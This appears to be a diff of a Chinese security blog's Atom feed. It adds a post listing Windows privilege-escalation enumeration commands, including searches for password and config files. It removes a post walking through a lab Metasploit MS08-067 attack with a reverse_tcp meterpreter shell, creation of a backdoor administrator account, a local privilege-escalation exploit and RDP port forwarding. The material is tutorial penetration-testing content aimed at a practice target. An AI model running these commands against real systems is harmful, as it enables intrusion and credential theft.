@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-05-18T08:49:06.858Z</updated>
+  <updated>2017-05-19T13:55:20.432Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,111 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>windows权限提升基础</title>
+    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/05/19/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%9F%BA%E7%A1%80.html"/>
+    <id>http://yoursite.com/渗透/2017/05/19/windows权限提升基础.html</id>
+    <published>2017-05-19T13:50:40.000Z</published>
+    <updated>2017-05-19T13:55:20.432Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-获取操作系统信息"><a href="#0x01-获取操作系统信息" class="headerlink" title="0x01 获取操作系统信息"></a>0x01 获取操作系统信息</h3><ul>
+<li><p>识别操作系统名称及版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</div><div class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</div></pre></td></tr></table></figure>
+</li>
+<li><p>识别系统体系结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo %PROCESSOR_ARCHITECTURE%</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li><p>查看所有环境变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SET</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看在线用户，有时候低权限看不到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">query user</div></pre></td></tr></table></figure>
+</li>
+<li><p>查询终端端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看某特定用户信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net user test</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="0x02-获取网络信息"><a href="#0x02-获取网络信息" class="headerlink" title="0x02 获取网络信息"></a>0x02 获取网络信息</h3><ul>
+<li><p>查看路由表信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route print</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看ARP缓存信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">arp -a</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看网络连接和防火墙规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netstat -ano</div><div class="line">netsh firewall show config</div><div class="line">netsh firewall show state</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="0x03-应用程序及服务信息"><a href="#0x03-应用程序及服务信息" class="headerlink" title="0x03 应用程序及服务信息"></a>0x03 应用程序及服务信息</h3><ul>
+<li><p>查看计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schtasks /QUERY /fo LIST /v</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看服务进程ID</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tasklist /SVC</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看已经启动Windows 服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net start</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看安装驱动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DRIVERQUERY</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看安装程序和版本信息（漏洞利用线索）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic product list brief</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看服务、进程和启动程序信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wmic service list brief</div><div class="line">wmic process list brief</div><div class="line">wmic startup list brief</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看服务权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc qc mysqla</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看安装补丁和时间信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div></pre></td></tr></table></figure>
+</li>
+<li><p>查看特定漏洞补丁信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="0x04-敏感数据和目录"><a href="#0x04-敏感数据和目录" class="headerlink" title="0x04 敏感数据和目录"></a>0x04 敏感数据和目录</h3><ul>
+<li>查找密码文件或其它敏感文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cd/</div><div class="line">dir /b/s password.txt # Will search for all password.txt files on the filesystem.</div><div class="line">dir /b/s config.* # Will search for all files starting with &apos;config&apos; on the filesystem.</div><div class="line">findstr /si password *.xml *.ini *.txt</div><div class="line">findstr /si login *.xml *.ini *.txt</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="0x05-文件系统"><a href="#0x05-文件系统" class="headerlink" title="0x05 文件系统"></a>0x05 文件系统</h3><ul>
+<li><p>打包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rar a -k -r -s -m3 c:\1.rar c:\folde</div></pre></td></tr></table></figure>
+</li>
+<li><p>检查文件夹可写状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dir /a-r-d /s /b</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>参考：<a href="http://www.goldfire.cc/index.php/archives/660" target="_blank" rel="external">http://www.goldfire.cc/index.php/archives/660</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-获取操作系统信息&quot;&gt;&lt;a href=&quot;#0x01-获取操作系统信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 获取操作系统信息&quot;&gt;&lt;/a&gt;0x01 获取操作系统信息&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;识别操作系统名称及版本&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;systeminfo | findstr /B /C:&amp;quot;OS 名称&amp;quot; /C:&amp;quot;OS 版本&amp;quot;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;识别系统体系结构&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;echo %PROCESSOR_ARCHITECTURE%&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="渗透测试，提权" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
   
   <entry>
     <title>一次基于Linux的渗透测试</title>
@@ -207,9 +312,9 @@
       <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
     
     
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
       <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
   </entry>
   
@@ -1031,9 +1136,9 @@ print c
       <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
     
     
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
       <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
   </entry>
   
@@ -2034,80 +2139,6 @@ service nessusd start     ##启动Nessus
     
     
       <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>基于Metasploit的简单渗透测试</title>
-    <link href="http://yoursite.com/uncategorized/2016/12/08/%E5%9F%BA%E4%BA%8EMetasploit%E7%9A%84%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"/>
-    <id>http://yoursite.com/uncategorized/2016/12/08/基于Metasploit的简单渗透测试.html</id>
-    <published>2016-12-08T01:41:23.000Z</published>
-    <updated>2016-12-08T02:05:05.904Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="0x00-Metasploitable"><a href="#0x00-Metasploitable" class="headerlink" title="0x00 Metasploitable"></a>0x00 Metasploitable</h3><p>Metasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。<br>本次测试使用xp系统的靶机，下载地址<br><a href="http://pan.baidu.com/s/1geMxsuJ" target="_blank" rel="external">http://pan.baidu.com/s/1geMxsuJ</a>  密码：xst1</p>
-<h3 id="0x01-查看详细信息"><a href="#0x01-查看详细信息" class="headerlink" title="0x01 查看详细信息"></a>0x01 查看详细信息</h3><p>使用nmap进行探测发现，使用nmap结合脚本进行扫描测试：<br><a id="more"></a><br>    nmap -sT -A –script=smb-check-vulns -P0 192<br>    -sT 使用TCP Connect扫描<br>    -A 是指高级操作系统探测功能，对一个特定服务进行更深的旗标和指纹攫取<br>    –script=smb-check-vulns 调用smb-check-vulns脚本<br>    -P0 进行更深层次的扫描，不进行主机发现.168.0.146</p>
-<p><img src="http://p1.bpimg.com/567571/826753312810080e.png" alt=""><br><img src="http://p1.bpimg.com/567571/7ca9db29aad66a2b.png" alt=""><br>发现探测出MS08-067漏洞，使用Metasploit进行攻击利用。</p>
-<h2 id="0x02-Metasploit的利用"><a href="#0x02-Metasploit的利用" class="headerlink" title="0x02 Metasploit的利用"></a>0x02 Metasploit的利用</h2><p>2.1 查找 MS08-067相关的模块<br><img src="http://p1.bpimg.com/567571/a638f3936515e739.png" alt=""></p>
-<p>2.2 使用选中的模块并查看<br><img src="http://p1.bpimg.com/567571/96be5eca3ce882a7.png" alt=""></p>
-<pre><code>set TARGET 5
-</code></pre><p>2.2 设置攻击参数<br>show options 查看一下参数，确保无误<br>设置PAYLOAD（攻击载荷）<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set RHOST 192.168.1.146 设置远程主机IP地址<br>set LHOST 192.168.1.179 设置反向连接地址为本机IP地址<br>set LPORT 55555 设置本机监听的TCP端口号<br>这个载荷在攻击成功后，会从目标主机发起一个反弹连接，连接到LHOST中指定的IP地址。</p>
-<p><img src="http://p1.bpimg.com/567571/307cb59fc9f7f5d8.png" alt=""></p>
-<p><img src="http://p1.bpimg.com/567571/732dc3a4eae6550e.png" alt=""></p>
-<p>2.3 开始攻击，发现已经上钩；</p>
-<p><img src="http://p1.bpimg.com/567571/ee09a90f249e897a.png" alt=""></p>
-<p><img src="http://p1.bpimg.com/567571/f662c66695f1fc58.png" alt=""></p>
-<h3 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h3><p>3.1 查看权限，判断是否需要进行提权</p>
-<blockquote>
-<p>getuid</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/5c47668de1bc99a3.png" alt=""></p>
-<p>3.2 增加用户名并设置为管理员</p>
-<blockquote>
-<p>net user zjw 123 /add<br>net localgroup administrators zjw /add</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/2b949608e42b51eb.png" alt=""><br><img src="http://p1.bqimg.com/567571/2fda087ffd9a4256.png" alt=""><br>3.3 开启3389端口远程登录</p>
-<blockquote>
-<p>run getgui -e </p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/a7728ce712c626d0.png" alt=""><br>3.4 远程连接目标主机</p>
-<blockquote>
-<p>rdesktop -f -a 16 192.168.0.146:3389<br>成功登陆目标主机</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/bbc3e104976b7066.png" alt=""></p>
-<h3 id="0x04-补充知识"><a href="#0x04-补充知识" class="headerlink" title="0x04 补充知识"></a>0x04 补充知识</h3><p>4.1 拿到shell只是普通用户怎么办？<br>上面演示的直接就是最高权限，当然这种情况在平时渗透测试中也是比较少见的，那么我们就得进行提权了。</p>
-<pre><code>meterpreter &gt; background
-msf exploit(handler) &gt; search ms16
-msf exploit(handler) &gt; use exploit/windows/local/ms16_016_webdav
-msf exploit(ms16_016_webdav) &gt; info
-msf exploit(ms16_016_webdav) &gt; show options
-msf exploit(ms16_016_webdav) &gt; set SESSION 1    # 设置会刚才我们后门连接的ID号 1
-msf exploit(ms16_016_webdav) &gt; exploit
-msf exploit(ms16_016_webdav) &gt; sessions
-msf exploit(ms16_016_webdav) &gt; sessions -i 1
-meterpreter &gt; getuid
-</code></pre><p><img src="http://p1.bpimg.com/567571/a6d950f8675b26b2.jpg" alt=""><br>这是发现我们怎么还是普通权限，我们进行查看进程。然后加载我们的进程号</p>
-<pre><code>meterpreter &gt; ps
-meterpreter &gt; migrate + 进程号
-</code></pre><p><img src="http://p1.bpimg.com/567571/1fb1e2c8eb2603d1.jpg" alt=""><br>这样已经提升为了system权限</p>
-<p>4.2 有时候我们在公网而目标主机在内网如何登陆？<br>这时候就要使用端口转发来实现了，将目标主机的端口转发到我们本机。</p>
-<pre><code>portfwd add -l 你本机的监听端口 -r 127.0.0.1 -p 3389
-</code></pre><p>执行之后所有端口3389的内网流量都会通过这个meterpreter的会话来转发到你kali的127.0.0.1的指定端口上 。<br>假如在这里我设置的监听端口为2222，那么我执行的就是</p>
-<pre><code>portfwd add -l 2222 -r 127.0.0.1 -p 3389
-</code></pre><p>然后开始连接远程桌面。新建一个终端窗口，执行连接Windows远程桌面的命令就OK了。</p>
-<pre><code>rdesktop 127.0.0.1:2222
-</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;0x00-Metasploitable&quot;&gt;&lt;a href=&quot;#0x00-Metasploitable&quot; class=&quot;headerlink&quot; title=&quot;0x00 Metasploitable&quot;&gt;&lt;/a&gt;0x00 Metasploitable&lt;/h3&gt;&lt;p&gt;Metasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。&lt;br&gt;本次测试使用xp系统的靶机，下载地址&lt;br&gt;&lt;a href=&quot;http://pan.baidu.com/s/1geMxsuJ&quot;&gt;http://pan.baidu.com/s/1geMxsuJ&lt;/a&gt;  密码：xst1&lt;/p&gt;
-&lt;h3 id=&quot;0x01-查看详细信息&quot;&gt;&lt;a href=&quot;#0x01-查看详细信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 查看详细信息&quot;&gt;&lt;/a&gt;0x01 查看详细信息&lt;/h3&gt;&lt;p&gt;使用nmap进行探测发现，使用nmap结合脚本进行扫描测试：&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
     
   </entry>
   
